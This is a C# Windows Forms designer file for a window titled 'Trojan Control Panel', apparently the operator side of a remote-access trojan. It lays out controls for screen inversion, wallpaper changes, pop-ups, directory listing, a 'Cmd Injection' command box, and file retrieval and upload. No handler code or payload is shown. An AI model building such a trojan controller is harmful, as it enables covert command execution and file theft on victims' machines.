namespace TroianServer
{
    partial class Form1
    {
        /// <summary>
        /// Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            this.InvertButton = new System.Windows.Forms.Button();
            this.RotateDegrees = new System.Windows.Forms.TextBox();
            this.RotateButton = new System.Windows.Forms.Button();
            this.Ox = new System.Windows.Forms.CheckBox();
            this.OY = new System.Windows.Forms.CheckBox();
            this.PopUp = new System.Windows.Forms.Button();
            this.PopUpText = new System.Windows.Forms.TextBox();
            this.ChangeWall = new System.Windows.Forms.Button();
            this.WallpaperURL = new System.Windows.Forms.TextBox();
            this.Stop = new System.Windows.Forms.Button();
            this.Navigate = new System.Windows.Forms.Button();
            this.NavigateDir = new System.Windows.Forms.TextBox();
            this.Custom = new System.Windows.Forms.Button();
            this.CustomCommand = new System.Windows.Forms.TextBox();
            this.GetFile = new System.Windows.Forms.Button();
            this.GetFileName = new System.Windows.Forms.TextBox();
            this.SendFile = new System.Windows.Forms.Button();
            this.SendFileName = new System.Windows.Forms.TextBox();
            this.Popup2 = new System.Windows.Forms.TextBox();
            this.richTextBox1 = new System.Windows.Forms.RichTextBox();
            this.copyPath = new System.Windows.Forms.TextBox();
            this.SuspendLayout();
            // 
            // InvertButton
            // 
            this.InvertButton.Location = new System.Drawing.Point(35, 21);
            this.InvertButton.Name = "InvertButton";
            this.InvertButton.Size = new System.Drawing.Size(125, 43);
            this.InvertButton.TabIndex = 0;
            this.InvertButton.Text = "Invert";
            this.InvertButton.UseVisualStyleBackColor = true;
            this.InvertButton.Click += new System.EventHandler(this.InvertButton_Click);
            // 
            // RotateDegrees
            // 
            this.RotateDegrees.Location = new System.Drawing.Point(203, 104);
            this.RotateDegrees.Name = "RotateDegrees";
            this.RotateDegrees.Size = new System.Drawing.Size(192, 22);
            this.RotateDegrees.TabIndex = 1;
            this.RotateDegrees.TextChanged += new System.EventHandler(this.RotateDegrees_TextChanged);
            // 
            // RotateButton
            // 
            this.RotateButton.Location = new System.Drawing.Point(35, 87);
            this.RotateButton.Name = "RotateButton";
            this.RotateButton.Size = new System.Drawing.Size(125, 39);
            this.RotateButton.TabIndex = 2;
            this.RotateButton.Text = "Rotate";
            this.RotateButton.UseVisualStyleBackColor = true;
            this.RotateButton.Click += new System.EventHandler(this.RotateButton_Click);
            // 
            // Ox
            // 
            this.Ox.AutoSize = true;
            this.Ox.Location = new System.Drawing.Point(203, 42);
            this.Ox.Name = "Ox";
            this.Ox.Size = new System.Drawing.Size(68, 21);
            this.Ox.TabIndex = 3;
            this.Ox.Text = "X Axis";
            this.Ox.UseVisualStyleBackColor = true;
            this.Ox.CheckedChanged += new System.EventHandler(this.Ox_CheckedChanged);
            // 
            // OY
            // 
            this.OY.AutoSize = true;
            this.OY.Location = new System.Drawing.Point(292, 43);
            this.OY.Name = "OY";
            this.OY.Size = new System.Drawing.Size(68, 21);
            this.OY.TabIndex = 4;
            this.OY.Text = "Y Axis";
            this.OY.UseVisualStyleBackColor = true;
            this.OY.CheckedChanged += new System.EventHandler(this.OY_CheckedChanged);
            // 
            // PopUp
            // 
            this.PopUp.Location = new System.Drawing.Point(35, 152);
            this.PopUp.Name = "PopUp";
            this.PopUp.Size = new System.Drawing.Size(125, 39);
            this.PopUp.TabIndex = 5;
            this.PopUp.Text = "Pop-up";
            this.PopUp.UseVisualStyleBackColor = true;
            this.PopUp.Click += new System.EventHandler(this.PopUp_Click);
            // 
            // PopUpText
            // 
            this.PopUpText.Location = new System.Drawing.Point(203, 168);
            this.PopUpText.Name = "PopUpText";
            this.PopUpText.Size = new System.Drawing.Size(141, 22);
            this.PopUpText.TabIndex = 6;
            this.PopUpText.TextChanged += new System.EventHandler(this.PopUpText_TextChanged);
            // 
            // ChangeWall
            // 
            this.ChangeWall.Location = new System.Drawing.Point(35, 218);
            this.ChangeWall.Name = "ChangeWall";
            this.ChangeWall.Size = new System.Drawing.Size(125, 43);
            this.ChangeWall.TabIndex = 7;
            this.ChangeWall.Text = "Change Wallpaper";
            this.ChangeWall.UseVisualStyleBackColor = true;
            this.ChangeWall.Click += new System.EventHandler(this.ChangeWall_Click);
            // 
            // WallpaperURL
            // 
            this.WallpaperURL.Location = new System.Drawing.Point(203, 238);
            this.WallpaperURL.Name = "WallpaperURL";
            this.WallpaperURL.Size = new System.Drawing.Size(394, 22);
            this.WallpaperURL.TabIndex = 8;
            this.WallpaperURL.TextChanged += new System.EventHandler(this.WallpaperURL_TextChanged);
            // 
            // Stop
            // 
            this.Stop.Location = new System.Drawing.Point(1076, 482);
            this.Stop.Name = "Stop";
            this.Stop.Size = new System.Drawing.Size(125, 42);
            this.Stop.TabIndex = 9;
            this.Stop.Text = "Stop";
            this.Stop.UseVisualStyleBackColor = true;
            this.Stop.Click += new System.EventHandler(this.button1_Click);
            // 
            // Navigate
            // 
            this.Navigate.Location = new System.Drawing.Point(35, 305);
            this.Navigate.Name = "Navigate";
            this.Navigate.Size = new System.Drawing.Size(125, 43);
            this.Navigate.TabIndex = 10;
            this.Navigate.Text = "List Files in Directory";
            this.Navigate.UseVisualStyleBackColor = true;
            this.Navigate.Click += new System.EventHandler(this.button1_Click_1);
            // 
            // NavigateDir
            // 
            this.NavigateDir.Location = new System.Drawing.Point(203, 326);
            this.NavigateDir.Name = "NavigateDir";
            this.NavigateDir.Size = new System.Drawing.Size(394, 22);
            this.NavigateDir.TabIndex = 11;
            this.NavigateDir.TextChanged += new System.EventHandler(this.NavigateDir_TextChanged);
            // 
            // Custom
            // 
            this.Custom.Location = new System.Drawing.Point(35, 392);
            this.Custom.Name = "Custom";
            this.Custom.Size = new System.Drawing.Size(125, 41);
            this.Custom.TabIndex = 12;
            this.Custom.Text = "Cmd Injection";
            this.Custom.UseVisualStyleBackColor = true;
            this.Custom.Click += new System.EventHandler(this.Custom_Click);
            // 
            // CustomCommand
            // 
            this.CustomCommand.Location = new System.Drawing.Point(203, 411);
            this.CustomCommand.Name = "CustomCommand";
            this.CustomCommand.Size = new System.Drawing.Size(394, 22);
            this.CustomCommand.TabIndex = 13;
            this.CustomCommand.TextChanged += new System.EventHandler(this.CustomCommand_TextChanged);
            // 
            // GetFile
            // 
            this.GetFile.Location = new System.Drawing.Point(716, 21);
            this.GetFile.Name = "GetFile";
            this.GetFile.Size = new System.Drawing.Size(90, 42);
            this.GetFile.TabIndex = 14;
            this.GetFile.Text = "Get File";
            this.GetFile.UseVisualStyleBackColor = true;
            this.GetFile.Click += new System.EventHandler(this.GetFile_Click);
            // 
            // GetFileName
            // 
            this.GetFileName.Location = new System.Drawing.Point(812, 41);
            this.GetFileName.Name = "GetFileName";
            this.GetFileName.Size = new System.Drawing.Size(527, 22);
            this.GetFileName.TabIndex = 15;
            this.GetFileName.TextChanged += new System.EventHandler(this.GetFileName_TextChanged);
            // 
            // SendFile
            // 
            this.SendFile.Location = new System.Drawing.Point(716, 94);
            this.SendFile.Name = "SendFile";
            this.SendFile.Size = new System.Drawing.Size(90, 42);
            this.SendFile.TabIndex = 16;
            this.SendFile.Text = "Send File";
            this.SendFile.UseVisualStyleBackColor = true;
            this.SendFile.Click += new System.EventHandler(this.SendFile_Click);
            // 
            // SendFileName
            // 
            this.SendFileName.Location = new System.Drawing.Point(812, 114);
            this.SendFileName.Name = "SendFileName";
            this.SendFileName.Size = new System.Drawing.Size(245, 22);
            this.SendFileName.TabIndex = 17;
            this.SendFileName.TextChanged += new System.EventHandler(this.SendFileName_TextChanged);
            // 
            // Popup2
            // 
            this.Popup2.Location = new System.Drawing.Point(399, 169);
            this.Popup2.Name = "Popup2";
            this.Popup2.Size = new System.Drawing.Size(177, 22);
            this.Popup2.TabIndex = 18;
            this.Popup2.TextChanged += new System.EventHandler(this.Popup2_TextChanged);
            // 
            // richTextBox1
            // 
            this.richTextBox1.Location = new System.Drawing.Point(707, 181);
            this.richTextBox1.Name = "richTextBox1";
            this.richTextBox1.Size = new System.Drawing.Size(686, 284);
            this.richTextBox1.TabIndex = 19;
            this.richTextBox1.Text = "";
            this.richTextBox1.TextChanged += new System.EventHandler(this.richTextBox1_TextChanged);
            // 
            // copyPath
            // 
            this.copyPath.Location = new System.Drawing.Point(1076, 114);
            this.copyPath.Name = "copyPath";
            this.copyPath.Size = new System.Drawing.Size(263, 22);
            this.copyPath.TabIndex = 20;
            this.copyPath.TextChanged += new System.EventHandler(this.copyPath_TextChanged);
            // 
            // Form1
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(8F, 16F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.ClientSize = new System.Drawing.Size(1405, 536);
            this.Controls.Add(this.copyPath);
            this.Controls.Add(this.richTextBox1);
            this.Controls.Add(this.Popup2);
            this.Controls.Add(this.SendFileName);
            this.Controls.Add(this.SendFile);
            this.Controls.Add(this.GetFileName);
            this.Controls.Add(this.GetFile);
            this.Controls.Add(this.CustomCommand);
            this.Controls.Add(this.Custom);
            this.Controls.Add(this.NavigateDir);
            this.Controls.Add(this.Navigate);
            this.Controls.Add(this.Stop);
            this.Controls.Add(this.WallpaperURL);
            this.Controls.Add(this.ChangeWall);
            this.Controls.Add(this.PopUpText);
            this.Controls.Add(this.PopUp);
            this.Controls.Add(this.OY);
            this.Controls.Add(this.Ox);
            this.Controls.Add(this.RotateButton);
            this.Controls.Add(this.RotateDegrees);
            this.Controls.Add(this.InvertButton);
            this.Name = "Form1";
            this.Text = "Trojan Control Panel";
            this.FormClosed += new System.Windows.Forms.FormClosedEventHandler(this.Form1_FormClosed);
            this.Load += new System.EventHandler(this.Form1_Load);
            this.ResumeLayout(false);
            this.PerformLayout();

        }

        #endregion

        private System.Windows.Forms.Button InvertButton;
        private System.Windows.Forms.TextBox RotateDegrees;
        private System.Windows.Forms.Button RotateButton;
        private System.Windows.Forms.CheckBox Ox;
        private System.Windows.Forms.CheckBox OY;
        private System.Windows.Forms.Button PopUp;
        private System.Windows.Forms.TextBox PopUpText;
        private System.Windows.Forms.Button ChangeWall;
        private System.Windows.Forms.TextBox WallpaperURL;
        private System.Windows.Forms.Button Stop;
        private System.Windows.Forms.Button Navigate;
        private System.Windows.Forms.TextBox NavigateDir;
        private System.Windows.Forms.Button Custom;
        private System.Windows.Forms.TextBox CustomCommand;
        private System.Windows.Forms.Button GetFile;
        private System.Windows.Forms.TextBox GetFileName;
        private System.Windows.Forms.Button SendFile;
        private System.Windows.Forms.TextBox SendFileName;
        private System.Windows.Forms.TextBox Popup2;
        private System.Windows.Forms.RichTextBox richTextBox1;
        private System.Windows.Forms.TextBox copyPath;
    }
}